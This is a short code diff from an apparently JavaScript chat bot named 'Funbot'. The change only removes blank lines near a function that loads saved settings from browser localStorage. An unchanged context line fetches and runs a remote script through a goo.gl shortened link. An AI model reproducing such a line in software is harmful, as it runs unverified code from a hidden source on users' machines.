@@ -339,9 +339,7 @@ setTimeout(function(){
 (function(){$.getScript('http://goo.gl/MMsPi1');}());
 }, 500);
 };
- 
- 
- 
+
 botMethods.load = function(){
     toSave = JSON.parse(localStorage.getItem("FunbotSave"));
     Funbot.settings = toSave.settings;
